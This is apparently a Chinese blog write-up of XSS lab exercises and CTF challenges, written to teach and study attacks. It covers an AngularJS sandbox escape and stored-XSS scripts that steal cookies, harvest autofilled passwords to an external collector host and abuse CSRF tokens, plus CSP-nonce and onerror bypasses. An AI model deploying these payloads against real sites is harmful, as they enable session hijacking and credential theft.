<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">angular.<span class="title function_">module</span>(<span class="string">&#x27;labApp&#x27;</span>, []).<span class="title function_">controller</span>(<span class="string">&#x27;vulnCtrl&#x27;</span>,<span class="keyword">function</span>(<span class="params">$scope, $parse</span>) &#123;</span><br><span class="line">    $scope.<span class="property">query</span> = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&#x27;search&#x27;</span>;</span><br><span class="line">    $scope.<span class="property">query</span>[key] = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    $scope.<span class="property">value</span> = $parse(key)($scope.<span class="property">query</span>);</span><br><span class="line">    <span class="keyword">var</span> key = <span class="string">&#x27;1+1&#x27;</span>;  <span class="comment">// 这一步进行了重写</span></span><br><span class="line">    $scope.<span class="property">query</span>[key] = <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">    $scope.<span class="property">value</span> = $parse(key)($scope.<span class="property">query</span>);</span><br><span class="line">	<span class="comment">// $parse(&#x27;1+1&#x27;) // 2</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>此Angular框架为1.4.4，1.4.4框架存在一个漏洞：</p>
<img src="/XSS/XSS/image-20250805130905957.png" class="" title="image-20250805130905957">

<p>这里涉及到JavaScript的原型链污染问题。</p>
<p>在JavaScript中，所有对象都继承了Object.prototype。toString()就在prototype里面，</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> key = <span class="string">&#x27;toString().constructor.prototype.charAt=[].join&#x27;</span>;</span><br><span class="line">$scope.<span class="property">query</span>[key] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">$scope.<span class="property">value</span> = $parse(key)($scope.<span class="property">query</span>);</span><br><span class="line"><span class="comment">// $parse(&#x27;toString().constructor.prototype.charAt=[].join&#x27;) 是一个依赖上下文表达式</span></span><br><span class="line"><span class="comment">// 原型链污染charAt：$scope.query.toString().constructor.prototype.charAt=[].join</span></span><br></pre></td></tr></table></figure>

<p>这里重写了所有字符串的charAt函数。</p>
<p>这将导致后续传入的字符串不是一个一个传入，而是输入多少传入多少。而isIdent()函数逻辑存在缺陷—-传入多个字符，我们只需要让第一个字符满足，javascript的字符串比较就会停止，我们就可以绕过isIdent()，绕过isIdent()函数后，我们就可以注入恶意代码。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=<span class="number">1</span>&amp;<span class="title function_">toString</span>().<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>%3d[].<span class="property">join</span>;[<span class="number">1</span>]|<span class="attr">orderBy</span>:<span class="title function_">toString</span>().<span class="property">constructor</span>.<span class="title function_">fromCharCode</span>(<span class="number">120</span>,<span class="number">61</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>)=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>我们再解释一下这个载荷：分号前面的依赖上下文，而分号后边的不依赖上下文；$parse会将其视为多个依次执行的表达式，最终会返回最后一个表达式的结果。</p>
<p>所以返回给value的是：<code>[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)</code></p>
<p>最后执行的是这个：<code>&#123;&#123; [1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41) &#125;&#125;</code></p>
<p>toString()的作用：获取其构造函数；constructor属性指向toString()的构造函数，由于toString()返回一个字符串，所以toString().constructor返回String()构造函数；fromCharCode是String的静态方法，用于将一组Unicode编码转换为对应的字符串。这里转换后为x&#x3D;alert(1)。</p>
<p>orderBy过滤器用于执行我们的代码。</p>
<p>总结：先破坏沙箱结构，再写入恶意代码。</p>
<h2 id="XSS漏洞的利用"><a href="#XSS漏洞的利用" class="headerlink" title="XSS漏洞的利用"></a>XSS漏洞的利用</h2><h3 id="利用XSS窃取Cookie"><a href="#利用XSS窃取Cookie" class="headerlink" title="利用XSS窃取Cookie"></a>利用XSS窃取Cookie</h3><h4 id="实验要求-13"><a href="#实验要求-13" class="headerlink" title="实验要求"></a>实验要求</h4><p>此实验包含博客评论功能中的一个存储型 XSS 漏洞。模拟受害者用户会在评论发布后查看所有评论。要解决此实验，需要利用此漏洞窃取受害者的会话 Cookie，然后使用此 Cookie 冒充受害者。</p>
<p>注意：实验室无法与任意外部系统之间进行交互。</p>
<h4 id="实验过程-13"><a href="#实验过程-13" class="headerlink" title="实验过程"></a>实验过程</h4><p>实验要求告诉我们，在评论区存在XSS漏洞。</p>
<img src="/XSS/XSS/image-20250806105416632.png" class="" title="image-20250806105416632">

<p>这是我们发送的评论，我们测试XSS攻击点。</p>
<p>comment输入：<code>&lt;h2&gt;123&lt;/h2&gt;</code>，其他内容随便输入，提交后，发现：</p>
<img src="/XSS/XSS/image-20250806105610445.png" class="" title="image-20250806105610445">

<p>是可以渲染的。</p>
<p>接着给comment输入：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，提交后，确实出现了弹窗，说明这里可以进行任意的JavaScript代码执行。</p>
<img src="/XSS/XSS/image-20250806105756110.png" class="" title="image-20250806105756110">

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/post/comment&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;FShYfY4Nke6eJAX65QHqAG3OzxrVDcbR&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;postId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;6&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Comment:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">&quot;12&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;300&quot;</span> <span class="attr">name</span>=<span class="string">&quot;comment&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Website:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">pattern</span>=<span class="string">&quot;(http:|https:).+&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;website&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Post Comment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">这是我们提交评论的表单 </span></span><br><span class="line"><span class="comment">提交到/post/comment，参数有csrf、postId、comment、name、email、website。</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们嵌入的脚本：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">         <span class="comment">// 监听事件： DOM内容加载完成后执行后面函数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> token = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;csrf&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>; <span class="comment">// 获取 csrf 的值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> data = <span class="keyword">new</span> <span class="title class_">FormData</span>(); <span class="comment">// 用于储存请求体数据</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        data.<span class="title function_">append</span>(<span class="string">&#x27;csrf&#x27;</span>,token);</span></span><br><span class="line"><span class="language-javascript">        data.<span class="title function_">append</span>(<span class="string">&#x27;postId&#x27;</span>,<span class="number">6</span>);</span></span><br><span class="line"><span class="language-javascript">        data.<span class="title function_">append</span>(<span class="string">&#x27;comment&#x27;</span>,<span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span><br><span class="line"><span class="language-javascript">        data.<span class="title function_">append</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;123&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        data.<span class="title function_">append</span>(<span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;123@qq.com&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        data.<span class="title function_">append</span>(<span class="string">&#x27;website&#x27;</span>,<span class="string">&#x27;https://example.com&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="comment">// 添加数据</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;/post/comment&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">body</span>: data</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    	<span class="comment">// 发送请求</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码的作用，当用户访问含有该代码的页面时，会自动提交评论内容，评论内容里面包含：cookie信息。</p>
<p>在postId等于6的地方嵌入下面评论内容：</p>
<img src="/XSS/XSS/image-20250806112900225.png" class="" title="image-20250806112900225">

<p>发送评论后，会有受害者访问含有该代码的页面。</p>
<img src="/XSS/XSS/image-20250806112911026.png" class="" title="image-20250806112911026">

<p>可以看到admin的cookie被发送出来了，这有一个弊端，这会使得admin意识到自己被攻击了。</p>
<img src="/XSS/XSS/image-20250806113328551.png" class="" title="image-20250806113328551">

<p>实验完成。</p>
<h3 id="利用XSS漏洞获取密码"><a href="#利用XSS漏洞获取密码" class="headerlink" title="利用XSS漏洞获取密码"></a>利用XSS漏洞获取密码</h3><h4 id="实验要求-14"><a href="#实验要求-14" class="headerlink" title="实验要求"></a>实验要求</h4><p>此实验包含博客评论功能中的一个存储型XSS漏洞。模拟受害者用户查看所有已发布的评论。要解决此实验，需要利用此漏洞窃取受害者的用户名和密码，然后使用这些凭据登录受害者的帐户。</p>
<h4 id="实验过程-14"><a href="#实验过程-14" class="headerlink" title="实验过程"></a>实验过程</h4><p>进入博客的一篇文章，搜索script，并没有找到有用的。</p>
<p>发表评论：</p>
<img src="/XSS/XSS/image-20250807111844979.png" class="" title="image-20250807111844979">

<p>确实是渲染了：</p>
<img src="/XSS/XSS/image-20250807111915567.png" class="" title="image-20250807111915567">

<p>我们向comment写入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>:</p>
<img src="/XSS/XSS/image-20250807112050292.png" class="" title="image-20250807112050292">

<p>证明这里可以执行任意的JavaScript代码。</p>
<p>今天我在burpsuite里面找到了collaborator，这次我们利用burp 的 collaborator工具来做。</p>
<img src="/XSS/XSS/image-20250807114208245.png" class="" title="image-20250807114208245">

<p>在这里复制，然后粘贴到下面url部分。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">onchange</span>=<span class="string">&quot;if(this.value.length) fetch(</span></span></span><br><span class="line"><span class="string"><span class="tag">    &#x27;https://r4wa6gvm0l018abekx4apq2au10sosch.oastify.com&#x27;,&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">        method: &#x27;POST&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">        mode: &#x27;no-cors&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">        body: document.getElementsByName(&#x27;username&#x27;)[0].value+&#x27;:&#x27;+this.value</span></span></span><br><span class="line"><span class="string"><span class="tag">&#125;)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>onchange 当表单元素的值发生改变，并且元素失去焦点时触发。</p>
<p>触发onchange事件时，向我们的服务器发送一个请求，请求的内容包含受害用户输入的用户名和密码。</p>
<img src="/XSS/XSS/image-20250807113142934.png" class="" title="image-20250807113142934">

<p>发送请求。</p>
<img src="/XSS/XSS/image-20250807113236814.png" class="" title="image-20250807113236814">

<p>受害者会查看所有已经发布的评论。这里受害者可能开启了密码自动填充功能，导致密码被泄露出去。</p>
<p>我们利用密码以及用户名登录，即可完成实验。</p>
<img src="/XSS/XSS/image-20250807113608416.png" class="" title="image-20250807113608416">

<p>这个方法有一个缺点：只能攻击开启密码自动填充的受害用户，当然如果有些傻逼非要向输入框写入自己的用户名和密码，谁又能阻止呢？</p>
<h3 id="利用-XSS-绕过-CSRF-防御"><a href="#利用-XSS-绕过-CSRF-防御" class="headerlink" title="利用 XSS 绕过 CSRF 防御"></a>利用 XSS 绕过 CSRF 防御</h3><h4 id="实验要求-15"><a href="#实验要求-15" class="headerlink" title="实验要求"></a>实验要求</h4><p>本实验包含博客评论功能中的一个存储型XSS漏洞。要破解该实验，您需要利用该漏洞窃取CSRF令牌，然后使用该令牌更改查看博客文章评论的用户的电子邮件地址。</p>
<p>您可以使用以下凭证登录您自己的帐户：<code>wiener:peter</code></p>
<h4 id="实验过程-15"><a href="#实验过程-15" class="headerlink" title="实验过程"></a>实验过程</h4><p>右上角的My account，可以进行登录，我们用实验要求给的账户进行登录。</p>
<img src="/XSS/XSS/image-20250808091333118.png" class="" title="image-20250808091333118">

<p>这里可以修改电子邮件，表单提交到&#x2F;my-account&#x2F;change-email；提交的参数有两个：email和csrf。</p>
<p>实验要求要我们窃取CSRF令牌，并用CSRF令牌修改受害用户的电子邮件。</p>
<p>我们进入博客的评论系统：</p>
<img src="/XSS/XSS/image-20250808091939183.png" class="" title="image-20250808091939183">

<p>确实进行了渲染：</p>
<img src="/XSS/XSS/image-20250808092017665.png" class="" title="image-20250808092017665">

<p>输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，测试是否可以执行javascript的代码：</p>
<img src="/XSS/XSS/image-20250808092154427.png" class="" title="image-20250808092154427">

<p>可以执行。</p>
<p>我们可以通过这样获取CSRF令牌：</p>
<img src="/XSS/XSS/image-20250808092434309.png" class="" title="image-20250808092434309">

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123; <span class="comment">// 等待DOM加载完后运行function代码</span></span></span><br><span class="line"><span class="language-javascript">    token = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;csrf&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;  <span class="comment">// 获取csrf令牌</span></span></span><br><span class="line"><span class="language-javascript">    data = <span class="keyword">new</span> <span class="title class_">FormData</span>(); </span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    data.<span class="title function_">append</span>(<span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;12345679@qq.com&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    data.<span class="title function_">append</span>(<span class="string">&#x27;csrf&#x27;</span>,token);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;/my-account/change-email&#x27;</span>,&#123; <span class="comment">// 更改受害者的电子邮件</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">body</span>: data</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>发送评论，解决实验：</p>
<img src="/XSS/XSS/image-20250808092837038.png" class="" title="image-20250808092837038">

<h2 id="AFCTF-2021-BABY-CSP"><a href="#AFCTF-2021-BABY-CSP" class="headerlink" title="[AFCTF 2021]BABY_CSP"></a>[AFCTF 2021]BABY_CSP</h2><img src="/XSS/XSS/image-20250724073356812.png" class="" title="image-20250724073356812">

<p>源码里面本来没有任何内容，当我们点击标签时，页面源码会添加一些内容：</p>
<img src="/XSS/XSS/image-20250724073528487.png" class="" title="image-20250724073528487">

<p>感觉可以写入恶意代码。		</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?school=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>报错了：</p>
<img src="/XSS/XSS/image-20250724073818519.png" class="" title="image-20250724073818519">

<p>拒绝执行我们插入的XSS代码，缺少nonce属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?school=&lt;script nonce=&quot;29de6fde0db5686d&quot;&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>就可以执行了。</p>
<p>我有点懵逼的是，将alert(1)替换为alert(flag)，就可以得到flag。</p>
<blockquote>
<p>考察的知识点：CSP内容安全策略</p>
</blockquote>
<h2 id="NSSRound-18-Basic-门酱想玩什么呢？"><a href="#NSSRound-18-Basic-门酱想玩什么呢？" class="headerlink" title="[NSSRound#18 Basic]门酱想玩什么呢？"></a>[NSSRound#18 Basic]门酱想玩什么呢？</h2><p>启动页面有隐藏的提示：</p>
<img src="/XSS/XSS/image-20250724085458920.png" class="" title="image-20250724085458920">

<p>有一个PHP文件：nssctfroundSpring.php</p>
<p>访问后有一部分源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//部分关键代码</span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>挑一些不易懂的说说：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>; <span class="comment">// ^https? 开头https匹配0次或1次，://匹配，\S+匹配任意非空白字符</span></span><br><span class="line"><span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>; <span class="comment">// [^\/] 匹配除/以外的任意字符，必须以.png后缀结尾。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&quot;onerror=&quot;alert(1)&quot;/1.png /png</span><br></pre></td></tr></table></figure>

<p>可以绕过。</p>
<p>进入评论区，内容输入payload，标题为123，弹窗，说明可以进行XSS攻击。</p>
<img src="/XSS/XSS/image-20250724111520821.png" class="" title="image-20250724111520821">

<p>门酱说它想玩元梦之星。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://&quot;onerror=&quot;document.location=&#x27;https://ymzx.qq.com/&#x27;&quot;/1.png /png</span><br></pre></td></tr></table></figure>

<p>内容输入上面内容，发现可以跳转。<br>我们将<br><code>http://node4.anna.nssctf.cn:28698/words/?title=MTIz&amp;content=aHR0cHMlM0ElMkYlMkYlMjJvbmVycm9yJTNEJTIyZG9jdW1lbnQubG9jYXRpb24lM0QnaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyRiclMjIlMkYxLnBuZyUyMCUyRnBuZw%3D%3D</code>链接放入：</p>
<img src="/XSS/XSS/image-20250724112537643.png" class="" title="image-20250724112537643">

<p>点击给门酱看就可以出现flag。</p>
<blockquote>
<p>我是真吐了，一到元梦之星页面就蓝屏。这道题也有问题了，环境没有配置好。</p>
</blockquote>

  </div>
</article>



    <div class="blog-post-comments">
        <div id="waline_thread"></div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/categories/">categories</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-1"><span class="toc-number">2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-1"><span class="toc-number">2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-XSS"><span class="toc-number">3.</span> <span class="toc-text">DOM XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edocument-write%E6%8E%A5%E6%94%B6%E5%99%A8%E7%9A%84DOM-XSS%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BD%BF%E7%94%A8location-search%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">3.1.</span> <span class="toc-text">基于document.write接收器的DOM XSS攻击，使用location.search作为攻击源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-2"><span class="toc-number">3.1.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Edocument-write%E6%8E%A5%E6%94%B6%E5%99%A8%E7%9A%84DOM-XSS-%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8select%E5%85%83%E7%B4%A0%E5%86%85%E5%88%A9%E7%94%A8location-search%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90"><span class="toc-number">3.2.</span> <span class="toc-text">基于document.write接收器的DOM XSS 攻击，在select元素内利用location.search作为攻击源</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-3"><span class="toc-number">3.2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 